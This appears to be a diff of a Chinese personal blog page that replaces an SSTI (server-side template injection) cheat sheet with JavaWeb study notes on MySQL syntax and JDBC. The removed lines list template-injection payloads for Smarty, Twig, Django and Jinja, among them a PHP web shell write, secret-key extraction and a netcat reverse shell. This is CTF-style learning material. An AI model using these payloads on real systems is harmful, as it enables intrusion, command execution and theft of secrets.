@@ -14,11 +14,11 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="ssti模板注入相关方法/解决问题">
+  <meta name="description" content="JavaWeb (for next part)">
   <meta name="author" content="OPN">
   <meta name="keywords" content="">
   
-  <title>SSTI模板注入 - OPN&#39;S BLOG</title>
+  <title>JavaWeb - OPN&#39;S BLOG</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -163,7 +163,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="SSTI模板注入">
+            <span class="h2" id="subtitle" title="JavaWeb">
               
             </span>
 
@@ -173,8 +173,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2022-02-23 19:18" pubdate>
-        2022年2月23日 晚上
+      <time datetime="2022-11-08 11:11" pubdate>
+        2022年11月8日 上午
       </time>
     </span>
   
@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      757 字
+      1.5k 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      9
+      18
        分钟
     </span>
   
@@ -233,74 +233,272 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">SSTI模板注入</h1>
+            <h1 style="display: none">JavaWeb</h1>
             
               <p class="note note-info">
                 
-                  本文最后更新于：8 个月前
+                  本文最后更新于：4 分钟前
                 
               </p>
             
             <div class="markdown-body">
-              <p>ssti模板注入相关方法/解决问题</p>
+              <p>JavaWeb (for next part)</p>
 <span id="more"></span>
 
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>简单了解了一下ssti原理  </p>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/aef2ae0498df">SSTI链接</a>  </p>
-<p><a target="_blank" rel="noopener" href="https://jiang-niao.github.io/2020/04/02/SSTi%20%E5%85%A8%E8%A7%A3%E6%9E%90/#SSTi-%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%BE%85%E6%9B%B4%E6%96%B0%EF%BC%89">SSTi 学习</a>  </p>
-<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/188172">SSTI/沙盒逃逸详细总结 </a>     </p>
-<p>简单来说， 当用户的输入数据没有被合理的处理控制时，就有可能数据插入了程序段中变成了程序的一部分，从而改变了程序的执行逻辑</p>
-<p>SSTI也是获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。当然还是和sql注入有所不同的，SSTI利用的是现在的网站模板引擎，主要针对python、php、java的一些网站处理框架，比如Python的jinja2 mako tornado django，php的smarty twig，java的jade velocity。当这些框架对运用渲染函数生成html的时候会出现SSTI的问题</p>
-<h2 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h2><p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档</p>
-<p>模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这就大大提升了开发效率，良好的设计也使得代码重用变得更加容易</p>
-<p>利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前</p>
-<p>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过</p>
-<h2 id="检测流程"><a href="#检测流程" class="headerlink" title="检测流程"></a>检测流程</h2><p><img src="/2022/02/23/ssti/ssti-1.png" srcset="/img/loading.gif" lazyload></p>
-<div class="hljs code-wrapper"><pre><code>首先输入&#123;&#123;7*7&#125;&#125;，返回值为49则表明存在SSTI
-
-输入&#123;&#123;system('cat /etc/passwd')&#125;&#125;如果返回值则表明为Smarty模板引擎
-
-输入&#123;&#123;7*'7'&#125;&#125;如果返回值是49则为Twig模板引擎
-
-如果返回值是7777777则为JinJa模板引擎
+<h1 id="JavaWeb"><a href="#JavaWeb" class="headerlink" title="JavaWeb"></a>JavaWeb</h1><p>用Java技术来解决相关web互联网领域的技术栈</p>
+<p><img src="/2022/11/08/JavaWeb/javaweb-1.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h3 id="关系型数据库-非关系型数据库"><a href="#关系型数据库-非关系型数据库" class="headerlink" title="关系型数据库/非关系型数据库"></a>关系型数据库/非关系型数据库</h3><p>关系型数据库是建立在关系模型基础上的数据库  </p>
+<p>简单说，关系型数据库是由多张能互相连接的二维表组成的数据库</p>
+<h3 id="安装mysql"><a href="#安装mysql" class="headerlink" title="安装mysql"></a>安装mysql</h3><p>管理员cmd</p>
+<div class="hljs code-wrapper"><pre><code>mysql -uxxx -pxxx
 </code></pre></div>
-<h2 id="姿势总结"><a href="#姿势总结" class="headerlink" title="姿势总结"></a>姿势总结</h2><h3 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h3><p>payload:</p>
-<div class="hljs code-wrapper"><pre><code>&#123;self::getStreamVariable(&quot;file:///etc/passwd&quot;)&#125;
+<h3 id="SQL语法—mysql不区分大小写"><a href="#SQL语法—mysql不区分大小写" class="headerlink" title="SQL语法—mysql不区分大小写"></a>SQL语法—mysql不区分大小写</h3><div class="hljs code-wrapper"><pre><code>show databases;
 
-&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())&#125;
+--注释 /# 注释
 
-&#123;literal&#125;alert(&#39;xss&#39;);&#123;/literal&#125;
-
-&#123;if readfile(&#39;/flag&#39;)&#125;&#123;/if&#125;
-
-/////
-&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;
+/* 注释 */
 </code></pre></div>
-<h3 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h3><p>payload:</p>
-<div class="hljs code-wrapper"><pre><code>&#123;self::getStreamVariable(&quot;file:///etc/passwd&quot;)&#125;
+<h4 id="SQL语法–操作数据库"><a href="#SQL语法–操作数据库" class="headerlink" title="SQL语法–操作数据库"></a>SQL语法–操作数据库</h4><div class="hljs code-wrapper"><pre><code>1、查询
+show databases;
 
-&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())&#125;
+2、创建
+创建数据库
+create database 数据库名称;
+create database if not exists 数据库名称;
 
-&#123;literal&#125;alert(&#39;xss&#39;);&#123;/literal&#125;
+3、删除
+drop database 数据库名称;
 
-&#123;if readfile(&#39;/flag&#39;)&#125;&#123;/if&#125;
+4、使用数据库
+查看当前使用的数据库
+select database();
+
+使用数据库
+use 数据库名称;
 </code></pre></div>
-<h3 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h3><p>payload:</p>
-<div class="hljs code-wrapper"><pre><code>&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;
-&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;
+<h4 id="SQL语法–操作表"><a href="#SQL语法–操作表" class="headerlink" title="SQL语法–操作表"></a>SQL语法–操作表</h4><div class="hljs code-wrapper"><pre><code>1、查询表
+查询当前数据库下所有表的名称
+show tables;
+
+查询表结构
+desc 表名称;
+
+2、创建表
+create table 表名(
+    字段名 数据类型
+    ...
+);
+
+3、删除表
+drop table 表名;
+drop table if exists 表名;
+
+4、修改表
+(1)修改表名
+alter table 表名 rename to 新的表名;
+
+(2)添加一列
+alter table 表名 add 列名 数据类型;
+
+(3)修改数据类型
+alter table 表名 modify 列名 新数据类型；
+
+(4)修改列名和数据类型
+alter table 表名 change 列名 新列名 新数据类型;
+
+(5)删除列
+alter table 表名 drop 列名;
 </code></pre></div>
-<h3 id="Jinja"><a href="#Jinja" class="headerlink" title="Jinja"></a>Jinja</h3><p>payload:</p>
-<div class="hljs code-wrapper"><pre><code>&#123;&#123; ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil', 'w').write('from os import system%0aSHELL = system') &#125;&#125;
-//写文件
-&#123;&#123; config.from_pyfile('/tmp/evil') &#125;&#125;
-//加载system
-&#123;&#123; config['SHELL']('nc xxxx xx -e /bin/sh') &#125;&#125;
-//执行命令反弹SHELL
+<h4 id="SQL语法–操作数据"><a href="#SQL语法–操作数据" class="headerlink" title="SQL语法–操作数据"></a>SQL语法–操作数据</h4><div class="hljs code-wrapper"><pre><code>1、添加数据
+给指定的列添加数据
+insert into 表名(列名1,列名2,...) values(值1,值2,...)；
+
+给全部的列添加数据/给表添加一条数据
+insert into 表名 values(值1,值2,...)；
+
+批量添加数据
+insert into 表名(列名1,列名2,...) values (值1,值2，...),(值1,值2，...),...;
+
+insert into 表名 values (值1,值2，...),(值1,值2，...),...;
+
+
+2、修改数据
+update 表名 set 列名1=值1,列名2=值2,...[where条件]；
+
+3、删除数据
+delete from 表名 [where条件];
 </code></pre></div>
-<h3 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h3><p>payload:</p>
-<div class="hljs code-wrapper"><pre><code>http://ip:port/opn90?msg=&#123;&#123;handler.settings&#125;&#125;
+<h4 id="SQL语法–查询数据"><a href="#SQL语法–查询数据" class="headerlink" title="SQL语法–查询数据"></a>SQL语法–查询数据</h4><div class="hljs code-wrapper"><pre><code>基础查询
+
+1、查询多个字段
+select * from 表名;
+
+2、去除重复记录
+select distinct 字段列表 from 表名;
+
+3、起别名
+as:
+
+条件查询
+
+select 字段列表 from 表名 where 条件列表;
+
+排序查询
+
+select 字段列表 from 表名 order by 排序字段名1[排序方式1],排序字段名2[排序方式2],...;
+
+分组查询
+
+聚合函数
+select 聚合函数名(列名) from 表;
+
+select 字段列表 from 表名 [where 分组前条件限定] group by 分组字段名 [having 分组后条件过滤];
+
+分页查询
+
+select 字段列表 from 表名 limit 起始索引, 查询条目数;
 </code></pre></div>
-<p><a target="_blank" rel="noopener" href="https://err0r.top/article/ssti/">附：https://err0r.top/article/ssti/</a></p>
+<p>where和having的区别</p>
+<p>执行时间不一样：where是分组之前进行限定，不满足where条件，则不参与分组，而having是分组之后对结果进行过滤</p>
+<p>可判断的条件不一样：where不能对聚合函数进行判断，having可以</p>
+<h4 id="SQL语法–约束"><a href="#SQL语法–约束" class="headerlink" title="SQL语法–约束"></a>SQL语法–约束</h4><h4 id="SQL语法–数据库设计"><a href="#SQL语法–数据库设计" class="headerlink" title="SQL语法–数据库设计"></a>SQL语法–数据库设计</h4><h4 id="SQL语法–多表查询"><a href="#SQL语法–多表查询" class="headerlink" title="SQL语法–多表查询"></a>SQL语法–多表查询</h4><h4 id="SQL语法–事务"><a href="#SQL语法–事务" class="headerlink" title="SQL语法–事务"></a>SQL语法–事务</h4><h3 id="navicat–可视化工具"><a href="#navicat–可视化工具" class="headerlink" title="navicat–可视化工具"></a>navicat–可视化工具</h3><h1 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h1><p>JDBC就是使用Java语言操作关系型数据库的一套API</p>
+<p>java数据库连接</p>
+<p><img src="/2022/11/08/JavaWeb/javaweb-2.png" srcset="/img/loading.gif" lazyload></p>
+<p>JDBC本质</p>
+<p>官方(sun公司)定义的一套操作所有关系型数据库的规则，即接口</p>
+<p>各个数据库厂商去实现这套接口，提供数据库驱动jar包</p>
+<p>可以使用这套接口(JDBC)编程，真正执行的代码是驱动jar包中的实现类</p>
+<p>JDBC好处  </p>
+<p>各数据库厂商使用相同的接口，Java代码不需要针对不同数据库分别开发</p>
+<p>可随时替换底层数据库，访问数据库的Java代码基本不变</p>
+<h3 id="JDBC-使用步骤"><a href="#JDBC-使用步骤" class="headerlink" title="JDBC 使用步骤"></a>JDBC 使用步骤</h3><div class="hljs code-wrapper"><pre><code>mysql-connector-java-5.1.48.jar    
+
+1.导入相应jar包
+2.将jar包添加到库
+
+3.
+public class JDBCDemo &#123;
+    public static void main(String[] args) throws Exception &#123;
+        //1.注册驱动  抛出异常
+        Class.forName(&quot;com.mysql.jdbc.Driver&quot;);
+
+        //2.获取连接j
+        String url=&quot;jdbc:mysql://127.0.0.1:3306/forjavaweb?useSSL=false&quot;;
+        String username=&quot;***&quot;;
+        String password=&quot;***&quot;;
+        Connection conn = DriverManager.getConnection(url,username,password);
+
+        //3.定义sql语句
+        String sql=&quot;update javasum set sum=999 where 1=1&quot;;
+
+        //4.获取执行sql的对象 Statement
+        Statement st = conn.createStatement();
+
+        //5.执行sql
+        int i = st.executeUpdate(sql); //受影响的行数
+
+        //6.处理结果
+        System.out.println(&quot;影响的行数：&quot;+i);
+
+        //7.释放资源
+        st.close();
+        conn.close();
+    &#125;
+&#125;
+</code></pre></div>
+<h3 id="JDBC-API-–-DriverManger"><a href="#JDBC-API-–-DriverManger" class="headerlink" title="JDBC API – DriverManger"></a>JDBC API – DriverManger</h3><p>1.注册驱动    </p>
+<p>2.获取数据库连接</p>
+<div class="hljs code-wrapper"><pre><code>注册驱动
+
+可省略注册驱动的步骤
+
+//Class.forName(&quot;com.mysql.jdbc.Driver&quot;);
+
+-----------------
+
+获取数据库连接
+
+static Connection 
+
+getConnection(String url, String user, String password)
+
+url:连接路径
+jdbc:mysql//127.0.0.1/3306/数据库名称?参数键值...
+useSSL=false
+
+本机连接可简写
+jdbc:mysql://127.0.0.1:3306/forjavaweb?useSSL=false
+
+jdbc:mysql:///forjavaweb?useSSL=false
+</code></pre></div>
+<h3 id="JDBC-API-–-Connection"><a href="#JDBC-API-–-Connection" class="headerlink" title="JDBC API – Connection"></a>JDBC API – Connection</h3><p>1.获取执行sql的对象</p>
+<p>2.管理事务</p>
+<div class="hljs code-wrapper"><pre><code>获取执行sql的对象
+
+Statement createStatement()
+
+预编译sql的执行sql对象：防止sql注入
+
+PreparedStatement prepareStatement(sql)
+
+-------------
+
+事务管理
+
+开启事务
+setAutoCommit(boolean autoCommit):true为自动提交事务; false为手动提交事务，即为开启事务
+
+提交事务
+commit()
+
+回滚事务
+rollback()    
+</code></pre></div>
+<h3 id="JDBC-API-–-Statement"><a href="#JDBC-API-–-Statement" class="headerlink" title="JDBC API – Statement"></a>JDBC API – Statement</h3><p>执行sql语句</p>
+<div class="hljs code-wrapper"><pre><code>int executeUpdate(sql) 执行增删改语句
+返回值为影响的行数
+
+ResultSet executeQuery(sql) 执行查询语句
+返回值为 ResultSet 结果集对象
+</code></pre></div>
+<h3 id="JDBC-API-–-ResultSet"><a href="#JDBC-API-–-ResultSet" class="headerlink" title="JDBC API – ResultSet"></a>JDBC API – ResultSet</h3><p>结果集对象</p>
+<p>封装了数据查询语句的结果</p>
+<p>获取查询结果</p>
+<div class="hljs code-wrapper"><pre><code>ResultSet stmt.executeQuery(sql)
+执行sql语句,返回ResultSet对象
+
+获取查询结果
+
+boolean next()
+1.将光标从当前位置向前移动一行
+2.判断当前行是否为有效行
+返回值：
+true 有效行 当前行有数据
+false 无效行 当前行没有数据    
+
+xxx getXxx(参数) 获取数据
+xxx 数据类型 如：int getInt(参数)
+</code></pre></div>
+<p>使用步骤</p>
+<div class="hljs code-wrapper"><pre><code>//循环判断游标是否是最后一行末尾
+while(rs.next())&#123;
+    //获取数据
+    rs.getXxx(参数);
+&#125;
+
+int 列的编号 
+String 列的名称
+</code></pre></div>
+<p>输出：</p>
+<div class="hljs code-wrapper"><pre><code>while(rs.next())
+    &#123;
+        int i = rs.getInt(1);
+        int i2 = rs.getInt(2);
+
+        System.out.println(i);
+        System.out.println(i2);
+    &#125;
+</code></pre></div>
 
             </div>
             <hr>
@@ -311,7 +509,7 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/web-ssti/">web ssti</a>
+                      <a class="hover-with-bg" href="/tags/java-web/">java web</a>
                     
                   </div>
                 
@@ -328,9 +526,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/02/28/Docker/">
+                      <a href="/2022/11/08/SSM/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Docker</span>
+                        <span class="hidden-mobile">SSM</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -338,8 +536,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/02/21/Unserialize-ways/">
-                        <span class="hidden-mobile">Unserialize-ways</span>
+                      <a href="/2022/11/07/Java/">
+                        <span class="hidden-mobile">Java</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
